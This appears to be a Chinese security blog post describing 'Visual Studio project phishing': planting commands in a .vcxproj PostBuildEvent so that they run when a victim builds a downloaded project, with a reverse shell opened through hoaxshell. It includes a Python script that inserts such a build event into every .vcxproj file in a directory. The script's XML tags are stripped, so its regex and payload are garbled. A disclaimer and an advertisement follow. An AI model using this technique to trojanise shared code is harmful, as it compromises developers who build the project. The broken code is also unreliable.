# 原创
：  Visual Studio项目钓鱼

# Visual Studio项目钓鱼

## 0x01 漏洞成因

漏洞的形成主要是因为Visual Studio的项目文件（vcxproj）是基于XML格式的，XML文件本身并不包含可执行代码。然而，Visual Studio的XML解析器允许在项目文件中包含一些自定义的命令，这些命令可以在构建项目时被执行。

## 0x02 漏洞复现

正常情况下使用Visual Studio去编译github上下载的项目

<br/> 通过修改Visual Studio的项目文件（vcxproj)植入恶意命令

当项目被下载编译时机会执行命令

## 0x03 漏洞利用

可以直接反弹shell，通过hoaxshell直接生成powershell，并开启监听

将代码插入Visual Studio的项目文件（vcxproj）的XML标签中

直接编译，终端反弹shell

漏洞利用脚本：
1.  `import argparse` 1.  `import os` 1.  `import re` 1.   1.  `# 解析命令行参数` 1.  `parser = argparse.ArgumentParser(description='Insert PostBuildEvent node into .vcxproj files.')` 1.  `parser.add_argument('-d', '--directory', metavar='directory', type=str, default='.', help='the directory to search for .vcxproj files')` 1.  `parser.add_argument('-c', '--command', metavar='command', type=str, default='calc.exe', help='the command to be executed in the PostBuildEvent node')` 1.  `args = parser.parse_args()` 1.   1.  `# 定义正则表达式，用于匹配.vcxproj文件中的标签` 1.  `property_group_pattern = re.compile(r'\s*')` 1.   1.  `# 定义插入的节点内容` 1.  `post_build_event_node = '\n\n \n {command}\n \n\n'.format(command=args.command)` 1.   1.  `# 遍历指定目录下的所有文件和子目录` 1.  `for root, dirs, files in os.walk(args.directory):` 1.  `# 遍历当前目录下的所有文件` 1.  `for file in files:` 1.  `# 如果文件扩展名是.vcxproj，则进行处理` 1.  `if file.endswith('.vcxproj'):` 1.  `file_path = os.path.join(root, file)` 1.  `# 打开文件，读取全部内容` 1.  `with open(file_path, 'r', encoding='utf-8') as f:` 1.  `content = f.read()` 1.  `# 在标签后插入节点` 1.  `new_content = property_group_pattern.sub(post_build_event_node + '\\g', content)` 1.  `# 如果文件内容有变化，则写回文件` 1.  `if new_content != content:` 1.  `with open(file_path, 'w', encoding='utf-8') as f:` 1.  `f.write(new_content)` 
 申明：本账号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法。

###### **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2f74894cf8e04b7f87d9716681f6e26b.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/5b4209eac3784bd18f5e1cd6a5157e4e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/4a89b0c2a52a4f569a970e55dcbac0b4.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/4f211474c8ab4a5a910884e1d3423310.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/54c2816350ae4bf787d1c6eec0d4e837.png" width="665"/>

应急响应笔记

学习路线
